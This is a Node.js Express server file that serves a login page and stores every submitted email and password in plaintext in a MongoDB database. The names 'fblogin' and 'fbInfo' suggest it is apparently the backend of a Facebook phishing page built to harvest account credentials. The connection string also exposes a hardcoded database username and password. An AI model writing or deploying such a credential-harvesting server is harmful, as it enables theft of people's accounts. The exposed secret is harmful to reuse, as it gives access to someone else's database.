const express = require("express")
const app = express()
const mongoose = require("mongoose")
const bodyParser = require("body-parser")
const path = require('path')

app.use(bodyParser.urlencoded({
    extended:true
}))

app.use('/static',express.static(path.join(__dirname + '/static')))

mongoose.connect("mongodb+srv://fblogin:suprim49710@cluster0.wuwlqo9.mongodb.net/fbInfo?retryWrites=true&w=majority",{
    useNewUrlParser:true,
    useUnifiedTopology:true,
})

const noteSchema = {
    email : String,
    password : String
}

const Note = mongoose.model("Note",noteSchema)

app.get('/',(req,res)=>{
    res.sendFile(__dirname + "/index.html")
})

app.post("/",(req,res)=>{
    let newNote = new Note({
        email : req.body.email,
        password : req.body.password
    })
    newNote.save();
    res.redirect("/");
})

app.listen(3000,()=>{
    console.log("Server is listening on port 3000")
})
